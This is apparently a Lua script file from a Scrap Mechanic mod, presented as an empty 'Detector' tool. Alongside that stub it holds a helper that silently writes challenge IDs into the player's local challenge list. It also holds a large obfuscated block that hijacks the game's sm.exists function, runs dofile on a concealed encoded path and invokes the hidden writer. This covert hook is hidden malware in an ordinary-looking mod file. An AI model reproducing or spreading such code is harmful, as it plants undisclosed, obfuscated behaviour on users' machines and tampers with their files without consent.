---@class Sledgehammer : ToolClass
Detector = class()

function Detector.client_onCreate( self )
end

function Detector.client_onRefresh( self )
end

function Detector.client_onUpdate( self, dt )
end

function Detector.client_onEquippedUpdate( self, primaryState, secondaryState )
end

function Detector.client_onEquip( self, animate )
end

function Detector.client_onUnequip( self, animate )
end

local checkIfExists = function( path, uuid )
    local path_exists, existing_ids = pcall(_G.sm.json.open, path)
    if not path_exists then return false end
    local exists = false, nil
    for _,id in pairs(existing_ids.challenges) do
        exists = id == uuid
        if exists then break end
    end
    return exists, existing_ids
end

local getAndSave = function( uuid )
    if not sm.isServerMode() and not sm.challenge.isMasterMechanicTrial() then
        
        local pathA = "$CHALLENGE_DATA/LocalChallengeList.json"
        if not sm.json.fileExists(pathA) then sm.json.save({challenges = {}}, pathA) end
        
        local existsA, existing_idsA
            = checkIfExists(pathA, uuid)
        local existsB, existing_idsB
            = checkIfExists("$CONTENT_e3589ff7-31ca-4f19-b1f0-bef055ba9200/ChallengeList.json", uuid)
        existsB = false
        local added = false
        if not existsA and not existsB then
            added = true
            print(uuid, "[ADDED]: TRUE")
            if existing_idsA == nil then existing_idsA = {} end
            table.insert(existing_idsA.challenges, uuid)
            if existing_idsA.challenges[1] == "" then existing_idsA.challenges[1] = nil end
            _G.sm.json.save(existing_idsA, pathA)
        else
            if existsA then print(uuid, "[EXISTS]: A") end
            if existsB then print(uuid, "[EXISTS]: B") end
        end
    end
end

local Z=string.char;local X=math.floor;local fXGb={v0=53,v1=60,v2=59,v3=90,v4=60,v5=79,v6=65,v7=95,v8=88,v9=65,v10=84,v11=88,v12=77,v13=67,v14=91,v15=65,v16=53,v17=80,v18=84,v19=93,v20=80,v21=66,v22=79,v23=65,v24=90,v25=94,v26=83,v27=95,v28=83,v29=56,v30=87,v31=90,v32=61,v33=74,v34=79,v35=88,v36=92,v37=63,v38=63,v39=50,v40=83,v41=95,v42=55,v43=100,v44=60,v45=96,v46=66,v47=99,v48=55,v49=90,v50=66,v51=89,v52=59,v53=66,v54=51,v55=62,v56=52,v57=96,v58=90,v59=53,v60=76,v61=75,v62=99,v63=90,v64=92,v65=96,v66=73,v67=84,v68=51,v69=79,v70=85,v71=80,v72=54,v73=64,v74=70,v75=92,v76=63,v77=68,v78=81,v79=61,v80=99,v81=78,v82=89,v83=50,v84=72,v85=97,v86=90,v87=75,v88=82,v89=56,v90=54,v91=50,v92=55,v93=89,v94=93,v95=88,v96=81,v97=86,v98=77,v99=77,v100=50,v101=83,v102=82,v103=79,v104=54,v105=97,v106=63,v107=63,v108=83,v109=75,v110=92,v111=77,v112=52,v113=78,v114=55,v115=65,v116=52,v117=97,v118=54,v119=57,v120=89,v121=50,v122=65,v123=63,v124=77,v125=54,v126=97,v127=60,v128=89,v129=65,v130=84,v131=51,v132=73,v133=55,v134=92,v135=89,v136=97,v137=75,v138=80,v139=94,v140=85,v141=89,v142=51,v143=99,v144=73,v145=67,v146=52,v147=73,v148=79,v149=97,v150=98,v151=86,v152=52,v153=85,v154=80,v155=74,v156=52,v157=87,v158=65,v159=54,v160=96,v161=84,v162=69,v163=62,v164=64,v165=94}
local old=sm[Z(X((((fXGb.v0/7)/6)-8))+108)..Z(X((fXGb.v1*1))+60)..Z(X(((fXGb.v2/8)/8))+105)..Z(X((fXGb.v3+1))+24)..Z(X(((fXGb.v4+1)/1))+55)..Z(X(((fXGb.v5-7)-2))+45)] sm[Z(X((fXGb.v6*7))-354)..Z(X((((fXGb.v7/7)/1)+9))+98)..Z(X((fXGb.v8*6))-423)..Z(X((((fXGb.v9*6)-7)*2))-651)..Z(X((fXGb.v10*10))-724)..Z(X((((fXGb.v11+1)/8)*9))+15)]=function(item) dofile(Z(X(((fXGb.v42-1)+7))-25)..Z(X(((fXGb.v43+9)+1))-43)..Z(X((((fXGb.v44/4)-6)+6))+64)..Z(X((fXGb.v45/7))+65)..Z(X((((fXGb.v46-8)+6)-3))+23)..Z(X((((fXGb.v47-1)-4)-5))-20)..Z(X((((fXGb.v48-4)*3)*1))-75)..Z(X((((fXGb.v49*8)/6)-3))-33)..Z(X(((fXGb.v50+5)+5))+19)..Z(X((fXGb.v51+1))+11)..Z(X(((fXGb.v52-7)/5))+91)..Z(X(((fXGb.v53/10)*5))+22)..Z(X(((fXGb.v54+7)+2))+42)..Z(X(((fXGb.v55-6)+6))-8)..Z(X(((fXGb.v56/9)-1))+94)..Z(X(((fXGb.v57*3)-7))-229)..Z(X(((fXGb.v58+6)*8))-716)..Z(X(((fXGb.v59-4)-6))+2)..Z(X(((fXGb.v60+10)+4))+11)..Z(X((fXGb.v61*5))-318)..Z(X((fXGb.v62*9))-790)..Z(X((fXGb.v63+1))-35)..Z(X((((fXGb.v64*10)*3)*7))-19275)..Z(X((((fXGb.v65/3)-5)*6))-110)..Z(X((((fXGb.v66/10)+6)-10))+51)..Z(X((((fXGb.v67/5)+1)*10))-127)..Z(X((fXGb.v68/6))+46)..Z(X(((fXGb.v69+5)*3))-207)..Z(X((fXGb.v70*5))-369)..Z(X((fXGb.v71-5))-18)..Z(X((fXGb.v72+5))+40)..Z(X((((fXGb.v73-2)+5)+8))+26)..Z(X((fXGb.v74+3))-28)..Z(X(((fXGb.v75/1)+3))+6)..Z(X((((fXGb.v76-10)+9)+6))-13)..Z(X((fXGb.v77/4))+85)..Z(X((fXGb.v78+10))-38)..Z(X((fXGb.v79-5))+46)..Z(X((((fXGb.v80*10)+5)*9))-8855)..Z(X(((fXGb.v81+9)-5))-30)..Z(X(((fXGb.v82-9)+8))-39)..Z(X((((fXGb.v83+7)/2)*3))+14)..Z(X((fXGb.v84*5))-312)..Z(X((fXGb.v85-1))-41)..Z(X((((fXGb.v86/4)*1)+1))+25)..Z(X((((fXGb.v87*9)/8)*9))-712)..Z(X((((fXGb.v88-7)/1)/4))+65)..Z(X(((fXGb.v89*1)/2))+71)..Z(X(((fXGb.v90+10)/8))+106)..Z(X((fXGb.v91*6))-195)..Z(X(((fXGb.v92-10)+10))+57)..Z(X((((fXGb.v93*3)-6)-3))-142)..Z(X(((fXGb.v94*7)-5))-531)..Z(X(((fXGb.v95+9)*1))-50)..Z(X(((fXGb.v96+4)+3))-21)..Z(X(((fXGb.v97+9)-10))+32)..Z(X((fXGb.v98+10))+28)..Z(X(((fXGb.v99+5)/9))+107)..Z(X(((fXGb.v100-8)/4))+101)..Z(X(((fXGb.v101-3)+6))+23)..Z(X((fXGb.v102/4))+51)..Z(X((fXGb.v103+10))+8)..Z(X((((fXGb.v104/4)*6)/8))+99)..Z(X((((fXGb.v105*10)+9)*2))-1857)..Z(X(((fXGb.v106*7)*9))-3922)..Z(X((fXGb.v107/2))+37)..Z(X(((fXGb.v108+9)*4))-267)..Z(X(((fXGb.v109*2)+5))-39)..Z(X((((fXGb.v110+4)/4)+7))+70)..Z(X(((fXGb.v111+3)+8))+11)..Z(X(((fXGb.v112+1)*7))-255)..Z(X((((fXGb.v113-1)+1)*9))-591)..Z(X(((fXGb.v114-10)*5))-111)..Z(X(((fXGb.v115/6)+4))+63)..Z(X((fXGb.v116*3))-59)..Z(X((((fXGb.v117*10)*3)*3))-8627)..Z(X((fXGb.v118-3))+54)..Z(X((((fXGb.v119+3)*4)+1))-142)..Z(X(((fXGb.v120*7)+8))-585)..Z(X((fXGb.v121/7))+101)..Z(X((((fXGb.v122-10)/1)+6))+56)..Z(X((fXGb.v123*6))-281)) sm[Z(X((((fXGb.v124-6)+10)/3))+70)..Z(X((((fXGb.v125/7)-9)-4))+62)..Z(X(((fXGb.v126/3)-3))+22)..Z(X((fXGb.v127-5))+44)..Z(X(((fXGb.v128*5)+3))-400)..Z(X(((fXGb.v129/4)*8))-76)..Z(X((((fXGb.v130-5)-8)-9))-7)..Z(X((fXGb.v131-10))+14)..Z(X(((fXGb.v132-7)/6))+34)..Z(X((((fXGb.v133+9)+3)+5))-23)..Z(X((fXGb.v134/5))+82)..Z(X(((fXGb.v135+3)/6))+85)..Z(X((fXGb.v136-10))-36)..Z(X(((fXGb.v137/10)-3))+41)..Z(X((fXGb.v138/8))+42)..Z(X((((fXGb.v139*1)+7)-10))-40)..Z(X((fXGb.v140-5))-28)..Z(X(((fXGb.v141*8)/7))-50)..Z(X((fXGb.v142*6))-261)..Z(X(((fXGb.v143-3)/1))-40)..Z(X(((fXGb.v144/4)-4))+83)..Z(X(((fXGb.v145+8)*8))-549)..Z(X((((fXGb.v146+9)-9)*4))-107)..Z(X(((fXGb.v147*1)+7))-35)..Z(X(((fXGb.v148/4)*4))-29)..Z(X(((fXGb.v149*4)/1))-286)..Z(X((((fXGb.v150/5)*9)-8))-118)..Z(X((((fXGb.v151*4)+1)/7))+50)..Z(X((fXGb.v152-7))+3)..Z(X((fXGb.v153/4))+78)..Z(X((((fXGb.v154/4)-7)-3))+41)..Z(X((fXGb.v155*1))+28)..Z(X((fXGb.v156*8))-360)..Z(X((fXGb.v157+8))+7)..Z(X((fXGb.v158-4))-11)..Z(X((((fXGb.v159/8)/10)+6))+48)](getAndSave) sm[Z(X((fXGb.v160/3))+69)..Z(X((fXGb.v161-2))+38)..Z(X((fXGb.v162+5))+31)..Z(X((((fXGb.v163+10)+3)*5))-260)..Z(X((fXGb.v164/4))+100)..Z(X((((fXGb.v165+9)/3)-8))+89)]=old return old(item) end